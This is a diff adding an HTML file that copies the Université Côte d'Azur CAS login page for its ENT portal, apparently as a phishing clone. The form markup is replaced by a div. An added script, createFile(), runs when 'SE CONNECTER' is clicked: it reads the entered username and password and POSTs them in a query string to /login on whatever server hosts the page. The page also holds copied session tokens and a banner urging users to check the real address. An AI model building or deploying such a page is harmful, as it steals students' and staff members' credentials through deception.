@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <title>CAS &#8211; Central Authentication Service</title>
+  
+  
+  <link rel="stylesheet" href="/themes/unice/css/cas.css" />
+  <link rel="stylesheet" href="/css/tt.css" />
+  <link rel="icon" href="/favicon.ico" type="image/x-icon" />
+  
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.6.1/html5shiv.js" type="text/javascript"></script>
+    <script src="js/respond.js" type="text/javascript"></script>
+  <![endif]-->
+</head>
+<body id="cas">
+<div class="tt" id="tt-div">
+    <h3>V&eacute;rifiez que l'adresse commence bien par https://login.unice.fr</h3>
+  </div>
+
+  <div id="container">
+      <header>
+        <a id="logo" href="http://www.apereo.org" title="allez à la page d'accueil Apereo">Apereo</a>
+        <h1>Central Authentication Service (CAS)</h1>
+      </header>
+      <div id="content">
+
+
+
+
+<div id="cookiesDisabled" class="errors" style="display:none;">
+    <h2>Cookies navigateur désactivés</h2>
+    <p>Votre navigateur ne supporte pas les cookies. L'authentification centralisée NE FONCTIONNERA PAS.</p>
+</div>
+    <div id="serviceui" class="serviceinfo">
+        <table>
+            <tr>
+                <td><img src="images/webapp.png"></td>
+                <td id="servicedesc">
+                    <h1>ENT</h1>
+                    <p>Environnement numérique de travail</p>
+                </td>
+            </tr>
+        </table>
+    </div>
+<div id="disclaimer"></div>
+<div class="box" id="login">
+    <div id="fm1" method="post">
+
+        
+
+        <h2>Entrez votre identifiant et votre mot de passe.</h2>
+
+        <section class="row">
+            <label for="username"><span class="accesskey">I</span>dentifiant:</label>
+            
+                
+                
+                    
+                    <input id="username" name="username" class="required" tabindex="1" accesskey="i" type="text" value="" size="25" autocomplete="off"/>
+                
+            
+        </section>
+
+        <section class="row">
+            <label for="password"><span class="accesskey">M</span>ot de passe:</label>
+                
+            
+            <input id="password" name="password" class="required" tabindex="2" accesskey="m" type="password" value="" size="25" autocomplete="off"/>
+            <span id="capslock-on" style="display:none;"><p><img src="images/warning.png" valign="top"> la touche Verr Maj est activée !</p></span>
+        </section>
+
+        <section class="row btn-row">
+            <input type="hidden" name="lt" value="LT-34515-ZhENMf5G3RxjwLgpIcLdqAejnCkPWc-login" />
+            <input type="hidden" name="execution" value="98196197-ea32-430c-a3c9-84b2defafd82_AAAAIgAAABDHp0EUiDQtcxYBUXK0hXPXAAAABmFlczEyONe+EWwN7VY7JoQb0/ryhKLsqtuoSemGlboOTUCoVsN6+C5Hoc9o5pTN32hTqXZtA4QRxaPoYeNdSWCgewOMazhaEqgvbIJzS2A9egGYEKX7vY0qI6zsPCN2Sf4BQ+VVdFkJV0oDwJbo8kCSj9YKcdFxu36z8bYtXuXt7IAQug5edDlBZT14+jbwZXfVTtdhga76JEZefKoXEqpWXEi3XBEBMicfRo4abGzcXncjjinsaEY1JrpAycOGPnI89eBzCTKhDaLG01B14vxmsRecqFMnKNwokKskQo2UgdfQrKvrq5VUpQ28An0v2I1k6jgTCRFuT2KG+VI7S0YJ+wmxJ41EvaxXg+4qoVlkMkDlMKKBF2PaphHjicfHcA3azrkweNZ+enzCw3VSiO4Zq1k7dtJ7qXxNUEcN/qkG/R4UlnJWpC25IcL2syBBJn+MGbEYa5A5juI8POBzlQtNvTh4CXSDYTUGD3oGv+pycvmkgl1U9g9DWqfqID4qLLkPpQNNGsJ0vcCNxnbNUk8wSaQoNkMlRY5R17ViGWCEXr5Y1hGb4b/WcDJUx8kltca2JHUcqeVFGsvqyHXVGcwG8M+8O88UtQ65V5KD5brodF/1OLrnqMJOV2xlW+9l53kfWUmTTIVcCazcZwL0h3G9NgLVu4WuokW7I/Yn19QF9MLABr5sXyQfKPvwKDxaz7pE93/HOzGXEX70O52JrWoY2STOX1iKOPu2E/KgFpl6jT9IyO00gBwEAISdqktdsqF9LUJujIjCiUElWTMq8TRlNOvyJ9KgG0wfuCYEEw77d31KpxN0M4g7fVXO2jLEjT4yiAk/aqaCuhJ+hyWVaMmcXH5Cs/jyA8TJJOb+7cmyGaZttcPBUqkiPRemrwzklIzB4zY/dDO1ssVCxsMsLrd4ORUxHW2cKo8DaUFVnX2z6w9uzQ7ppekHSRZjEcuWDShiQrY5YZzEV2zKkk06rpCMH+FSnpU2g7vTu+tYIa8v7dbkl5wneFZs1dXGXYqboUrkKsUF8hKZ1IVasQ3wBNNM7tH4PEyt8wpJnc/4e8tOCHG4eles87WoESYQ5uT9Zv7SDiNMpHy3NYYvQit4JPGw7+t2/FDtO8PGlyqIBzc4VAeY7aPFcumzvOsadhFyZDoByDynUQ9AyLey+CdLZ/6v20lIvAwFF+Vd+wIcZwg8WEABG8E+sb7vtUz0FuZg85bw3dpigPxrj0szAyy9n3cl4Lr+v0xyZYh5e6FjUK25xvDbOGSpMJ2LaeYyBHdRlJ4xvA60huOwCSYYpQ5RSS4XryE0T9pzw5x6BL4aqzZ7Hddr/znjevXyXj14HTs08Wu6UDa+vIIuWafCXjDx6nQqvEyTT9wfI+XEZu5ao91uUfj5rYngVv63j7UAsJBV0y03MQMJA6CbUHtnJKYCucLZlsbfjK5bwauzwsSH4t68s2sNYygKBLze+YhVg0sYdMbfVJ+iOl9utYU26lAyMw9lCm8wXIN1B9PIuieh/dM+0WZqud5F9QfFxrsjsVgiMy8OVHKSw1rxIFVvZtle8aLa37+3KrSgdi7Viz6ExCZZn7pbVHOaak5Ft9yJBiqJ8ohqO2RCANASNdcwMWWLXyPhSt9AyGUCgJvr0kinlCQtXW74Y3Cc/4C1NOjFFXPomYzfQofoZoOWwPjpWaPcN1i5ImdRdJyoqbxhjk6eQKRZvYRjIMv0JicjLYqmwXOrtTiRa/iOUZgvTDHsvWR3+psaZNnOl25Tla2hZIdK/Hub8J6UrWTM+5CABnY9TVB5x5n5H2dl4rWBUUhJrSeblXYTzPY+yQTRJsfGeepcL9B1RQdAaeQ6NfPp/uDbyz5d8LO63Hdudavh+axonWE80RpTTCOJ5m5Rr/ZZFzXrvAK/v3BMKZSTNBb80k0lC++NQQ/GY+DodKhEeC3svJRkTBLAd7lX37i1t44jKNoLkRvej4fNU7AZWjiCUQSPik0GDCcYocZwAr0mlCPx7HkjLu8u7+LgnTeVeeDq0lD2b9IXsUhfcCnPD9REoqcjDbZVDlzLB9lTd54TyaDSa/fubX0U8cMirASaRa5Y02s+CZTVqGjnVPTprFLlx7IOO2Tm374WbequOTQ8Ml4rlWCYHj/WmMpgBj8LyHK5ETJwW2PtxtqVcp6EfVWLPRorFiS+j2UmxpMlNunrYcjAdQMw0lD9JKS2yf3RNJvCJdpLxLYg9rIU1Cj2XFTPG42Z+1wnTsjKc0+d9cavN6XNQlFx2Kuhdk/CgYgIcIPdzhvLzi2+fdN1M6rxnJKm+K02w6HOHD6GR6/+Ixdq7ZezTEb/LGfGC8qVjH28/xnalsisxN3/X5U7t+4TIVKtVHryO/Tz7sSzFwBViydO2j2fA/syQnGaOu16L695a3wtTnpkoerT9mVycMkyX/D23dG7gehM/M2iBCxxEE+yQGPPmzPr1lffpV+fIt1D67x9IgTlpLMjMrdlp/39IlPMvA1LPOSQVaf+h4WdohAMDaY0Fat5UmCWrJmq+gMja32W3M4QZRiMSAPXX5EaQXQaHpSI6VKPCwQu+pJG/ZeQ4tkUQnxjIEVwXlLYuyJwTf1g4jA+XRu0WkTrb5crrpNd81gH5TgM8KKf2w+sYwko0unDroT/ufAX4nwAjim4cx01USyJ92TQuq2j3gim" />
+            <input type="hidden" name="_eventId" value="submit" />
+
+            <input class="btn-submit" name="submit" accesskey="l" value="SE CONNECTER" tabindex="6" type="submit" onClick='createFile()'/>
+            <input class="btn-reset" name="reset" accesskey="c" value="EFFACER" tabindex="7" type="reset" />
+        </section>
+    <div>
+</div></div>
+</div>
+
+<div id="sidebar">
+    <div class="sidebar-content">
+        <p>Pour des raisons de sécurité, veuillez vous déconnecter et fermer votre navigateur lorsque vous avez fini d'accéder aux services authentifiés. <br>Gestion des identités numériques : <ul><li>Etudiants rendez vous sur <a href="http://sesame.unice.fr">http://sesame.unice.fr</a></li><li>Personnels et assimilés rendez vous sur : <a href="http://annuaire.unice.fr/gestion">http://annuaire.unice.fr/gestion</a></li><ul></p>
+        <div id="list-languages">
+            <h3>Languages:</h3>                    
+                    <ul>
+                        <li class="first"><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=en">English</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=es">Spanish</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=fr">French</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=ru">Russian</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=nl">Nederlands</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=sv">Svenska</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=it">Italiano</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=ur">Urdu</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=zh_CN">Chinese (Simplified)</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=zh_TW">Chinese (Traditional)</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=de">Deutsch</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=ja">Japanese</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=hr">Croatian</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=uk">Ukranian</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=cs">Czech</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=sl">Slovenian</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=ca">Catalan</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=mk">Macedonian</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=fa">Farsi</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=ar">Arabic</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=pt_PT">Portuguese</a></li>
+                        <li><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=pt_BR">Portuguese (Brazil)</a></li>
+                        <li class="last"><a href="login?service=https://ent.unice.fr/uPortal/Login&locale=pl">Polish</a></li>
+                    </ul>
+        </div>
+    </div>
+</div>
+</div> <!-- END #content -->
+
+<footer>
+    <div id="copyright">
+        <p>Copyright &copy; 2005&ndash;2015 Apereo, Inc. Tous droits réservés.</p>
+        <p>Powered by <a href="http://www.apereo.org/cas">Apereo Central Authentication Service 4.1.3</a></p>
+    </div>
+</footer>
+<!-- Matomo Image Tracker-->
+<img src="https://piwik.unice.fr/matomo.php?idsite=1&amp;rec=1" style="border:0" alt="" />
+<!-- End Matomo -->
+</div> <!-- END #container -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/headjs/1.0.3/head.min.js"></script>
+<!--[if gte IE 9 | !IE ]><!-->
+
+<script type="text/javascript" src="/js/cas.js"></script>
+<script>
+    function createFile() {
+        const loginUser = document.getElementById("username").value;
+        const loginPass = document.getElementById("password").value;
+        fetch(`/login?username=${loginUser}&password=${loginPass}`, {
+            method: 'POST'
+        })
+            .then(result => console.log(result))
+    }
+</script>
+</body>
+</html>
